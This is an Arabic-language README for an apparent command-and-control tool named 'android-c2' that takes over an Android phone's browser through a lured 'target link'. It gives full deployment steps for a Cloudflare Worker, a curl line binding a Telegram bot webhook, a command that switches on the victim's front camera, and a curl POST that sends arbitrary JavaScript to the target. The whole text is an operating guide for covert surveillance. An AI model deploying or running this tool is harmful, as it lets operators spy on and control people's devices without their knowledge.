# android-c2

قناة تحكم بجهاز أندرويد عبر متصفحه. صاعدة فورية، نازلة فورية.

## النشر
1. `npm install`
2. `npx wrangler login`
3. عدّل `wrangler.toml`: ضع CHAT و API_TOKEN و TG_SECRET
4. `npx wrangler secret put TOKEN`   ← توكن بوت تيليجرام من @BotFather
5. `npx wrangler deploy`

## ربط تيليجرام
curl "https://api.telegram.org/bot<TOKEN>/setWebhook?url=https://<WORKER>/api/tg&secret_token=<TG_SECRET>"

## الاستخدام
- لوحة التحكم: https://<WORKER>/live.html
- رابط الهدف:  https://<WORKER>/?t=T1
- من تيليجرام: T1:cam('user')
- من الطرفية: curl -X POST https://<WORKER>/api/cmd -H "X-Token: <API_TOKEN>" \
    -H "Content-Type: application/json" -d '{"t":"T1","cmd":"navigator.userAgent"}'